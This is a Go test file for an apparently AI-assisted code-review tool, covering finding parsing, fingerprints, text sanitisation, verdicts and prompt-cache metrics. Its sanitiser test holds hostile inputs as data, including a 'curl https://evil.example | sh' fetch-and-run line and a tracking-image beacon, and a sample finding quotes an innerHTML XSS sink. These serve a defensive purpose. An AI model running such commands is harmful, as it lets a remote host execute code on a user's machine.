package model

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestParseFileReviewValid(t *testing.T) {
	in := `{
	  "schema_version": 1,
	  "path": "a.go",
	  "outcome": "reviewed",
	  "findings": [{
	    "id": "f1",
	    "category": "injection",
	    "anchor": {"start_line": 88, "end_line": 88},
	    "title": "Display name is written to innerHTML unescaped",
	    "body": "Line 88 writes displayName into innerHTML.",
	    "impact": "A crafted name executes script in the victim's browser.",
	    "evidence": [{"line": 88, "quote": "el.innerHTML = user.displayName"}],
	    "external_claims": [],
	    "introduced_by": "added_line",
	    "confidence": "certain",
	    "fix": null
	  }]
	}`
	fr, err := ParseFileReview([]byte(in))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if fr.Path != "a.go" || len(fr.Findings) != 1 {
		t.Fatalf("bad parse: %+v", fr)
	}
	if !fr.Findings[0].Category.MayBlock() {
		t.Fatal("injection should be able to block")
	}
}

func TestParseFileReviewRejectsBannedClaimType(t *testing.T) {
	in := `{"schema_version":1,"path":"a.go","outcome":"reviewed","findings":[{
	  "id":"f1","category":"crash","anchor":{"start_line":1,"end_line":2},
	  "title":"t","body":"b","impact":"i",
	  "evidence":[{"line":1,"quote":"x"}],
	  "external_claims":[{"type":"version_behavior","subject":"actions/checkout@v5"}],
	  "introduced_by":"added_line","confidence":"likely"}]}`
	_, err := ParseFileReview([]byte(in))
	if err == nil || !strings.Contains(err.Error(), "version_behavior") {
		t.Fatalf("version_behavior must be rejected at parse time, got %v", err)
	}
}

func TestParseFileReviewRejectsUnknownCategory(t *testing.T) {
	in := `{"schema_version":1,"path":"a.go","outcome":"reviewed","findings":[{
	  "id":"f1","category":"bug","anchor":{"start_line":1,"end_line":1},
	  "title":"t","body":"b","impact":"i",
	  "evidence":[{"line":1,"quote":"x"}],"external_claims":[],
	  "introduced_by":"added_line","confidence":"certain"}]}`
	if _, err := ParseFileReview([]byte(in)); err == nil {
		t.Fatal("catch-all category 'bug' must not exist")
	}
}

func TestFingerprintSurvivesReformat(t *testing.T) {
	a := &ValidatedFinding{Finding: Finding{
		Category: CategoryCrash,
		Title:    "Rollback branch is unreachable",
		Evidence: []Evidence{{Line: 58, Quote: "if [ $? -ne 0 ]; then"}},
	}}
	b := &ValidatedFinding{Finding: Finding{
		Category: CategoryCrash,
		Title:    "rollback branch is UNREACHABLE!",
		Evidence: []Evidence{{Line: 61, Quote: "  IF   [ $? -ne 0 ]; THEN"}},
	}}
	if a.FingerprintOf() != b.FingerprintOf() {
		t.Fatalf("fingerprints should match across reformat:\n%s\n%s",
			a.FingerprintOf(), b.FingerprintOf())
	}
	// Path is a locator, not part of the fingerprint.
	a.Path, b.Path = "old/x.sh", "new/y.sh"
	if a.FingerprintOf() != b.FingerprintOf() {
		t.Fatal("path must not affect fingerprint")
	}
}

func TestSanitizeText(t *testing.T) {
	cases := [][2]string{
		{"see ![x](https://evil.example/beacon.png)", "see ![x] ([link removed])"},
		{"ping @coder and @org/all", "ping coder and org/all"},
		{"Fixes #123", "Fixes 123"},
		{"run curl https://evil.example | sh", "run curl [link removed] | sh"},
		{"hidden\u200bbidi\u202echar", "hiddenbidichar"},
	}
	for _, c := range cases {
		if got := SanitizeText(c[0]); got != c[1] {
			t.Errorf("SanitizeText(%q) = %q, want %q", c[0], got, c[1])
		}
	}
}

func TestVerdictConclusion(t *testing.T) {
	if VerdictPass.Conclusion() != "success" {
		t.Fatal("PASS maps to success")
	}
	if VerdictFound.Conclusion() != "failure" || VerdictCouldNotEvaluate.Conclusion() != "failure" {
		t.Fatal("fail-closed: FOUND and COULD_NOT_EVALUATE are failure")
	}
}

func TestSummaryOneSample(t *testing.T) {
	r := &RunRecord{Samples: 1, Coverage: Coverage{Reviewed: 7}}
	s := r.Summary()
	want := "1 sample · 7 files reviewed · 0 blocking findings. This is one observation, not assurance."
	b, _ := json.Marshal(s)
	_ = b
	if s != want {
		t.Fatalf("summary = %q, want %q", s, want)
	}
}

// §7: caching failure is silent — a prefix below the provider's minimum is
// skipped with no error. The only defence is asserting on the cache counters.
// CacheHitRate is the number CI asserts on.

func TestCacheHitRate(t *testing.T) {
	cases := []struct {
		name string
		u    Usage
		want float64
	}{
		{"zero input", Usage{}, 0},
		{"no cache", Usage{InputTokens: 1000}, 0},
		{"all read", Usage{InputTokens: 1000, CacheReadTokens: 1000}, 1},
		{"mixed", Usage{InputTokens: 21000, CacheReadTokens: 13500}, 13500.0 / 21000.0},
	}
	for _, c := range cases {
		if got := c.u.CacheHitRate(); got != c.want {
			t.Errorf("%s: CacheHitRate = %v, want %v", c.name, got, c.want)
		}
	}
}

// The ceiling is the best hit rate a run's own prompt shape allows: the
// first call with a given cacheable prefix pays the write, every later call
// with that prefix can read it, and the per-call payload after the prefix is
// never cacheable. Token counts are split in proportion to the recorded
// byte lengths, because a response reports one prompt-token total per call.
func TestCacheCeilingFromPrefixGroups(t *testing.T) {
	calls := []CallEntry{
		// triage: its own prefix, seen once, so nothing is readable
		{Unit: "triage", StartS: 0, Outcome: CallOK, InputTokens: 2000, PrefixID: "t", PrefixBytes: 4000, PromptBytes: 8000},
		// first review: pays the write for prefix "r"
		{Unit: "review", StartS: 1, Outcome: CallOK, InputTokens: 4000, PrefixID: "r", PrefixBytes: 6000, PromptBytes: 16000},
		// later reviews: 6000/12000 and 6000/24000 of their tokens readable
		{Unit: "review", StartS: 3, Outcome: CallOK, InputTokens: 3000, PrefixID: "r", PrefixBytes: 6000, PromptBytes: 12000},
		{Unit: "review", StartS: 2, Outcome: CallOK, InputTokens: 6000, PrefixID: "r", PrefixBytes: 6000, PromptBytes: 24000},
		// a failed call reports no tokens and changes nothing
		{Unit: "review", StartS: 4, Outcome: CallError, PrefixID: "r", PrefixBytes: 6000, PromptBytes: 9000},
	}
	want := (1500.0 + 1500.0) / (2000 + 4000 + 3000 + 6000)
	if got := CacheCeiling(calls); got < want-1e-9 || got > want+1e-9 {
		t.Fatalf("CacheCeiling = %v, want %v", got, want)
	}
	if got := CacheCeiling(nil); got != 0 {
		t.Fatalf("CacheCeiling(nil) = %v, want 0", got)
	}
}

// The first call of a prefix group is decided by start time, not by the order
// the call log happened to record completions in.
func TestCacheCeilingOrdersByStartTime(t *testing.T) {
	calls := []CallEntry{
		{StartS: 5, InputTokens: 1000, PrefixID: "r", PrefixBytes: 500, PromptBytes: 1000},
		{StartS: 1, InputTokens: 4000, PrefixID: "r", PrefixBytes: 500, PromptBytes: 4000},
	}
	want := 500.0 / 5000
	if got := CacheCeiling(calls); got < want-1e-9 || got > want+1e-9 {
		t.Fatalf("CacheCeiling = %v, want %v", got, want)
	}
}

// The advisory compares the measured rate against the ceiling, not against a
// flat number: 38% is healthy when the ceiling is 40%, and 50% is a cold-miss
// regression when the ceiling is 90%.
func TestCacheShortfallIsRelativeToTheCeiling(t *testing.T) {
	cases := []struct {
		name          string
		rate, ceiling float64
		want          bool
	}{
		{"near a low ceiling", 0.38, 0.40, false},
		{"far below a high ceiling", 0.50, 0.90, true},
		{"exactly at the fraction", MinCeilingFraction * 0.5, 0.5, false},
		{"no ceiling measured", 0, 0, false},
	}
	for _, c := range cases {
		if got := CacheShortfall(c.rate, c.ceiling); got != c.want {
			t.Errorf("%s: CacheShortfall(%v, %v) = %v, want %v", c.name, c.rate, c.ceiling, got, c.want)
		}
	}
}

// A model that wraps its schema-constrained answer in a markdown code fence
// was failing the whole file with
// `schema: invalid character '`' looking for beginning of value`. The fence is
// a transport artifact, not a contract violation.
func TestParseFileReviewAcceptsFencedJSON(t *testing.T) {
	body := `{"schema_version":1,"path":"a.go","outcome":"reviewed","findings":[]}`
	for _, tc := range []struct{ name, in string }{
		{"bare", body},
		{"json fence", "```json\n" + body + "\n```"},
		{"plain fence", "```\n" + body + "\n```"},
		{"fence with surrounding blank lines", "\n\n```json\n" + body + "\n```\n\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			fr, err := ParseFileReview([]byte(tc.in))
			if err != nil {
				t.Fatalf("ParseFileReview: %v", err)
			}
			if fr.Path != "a.go" || fr.Outcome != OutcomeReviewed {
				t.Errorf("got %+v", fr)
			}
		})
	}
}

// Unwrapping must not become repair: anything that is not exactly one fenced
// block is left alone and fails the schema check as before.
func TestUnwrapJSONLeavesNonFencedInputAlone(t *testing.T) {
	for _, in := range []string{
		`{"schema_version":1}`,
		"",
		"```",
		"```json\n{}",                           // no closing fence
		"```json\n{}\n```\nand then some prose", // trailing prose
		"here is my answer:\n```json\n{}\n```",  // leading prose
	} {
		if got := string(UnwrapJSON([]byte(in))); got != in {
			t.Errorf("UnwrapJSON(%q) = %q, want it untouched", in, got)
		}
	}
}
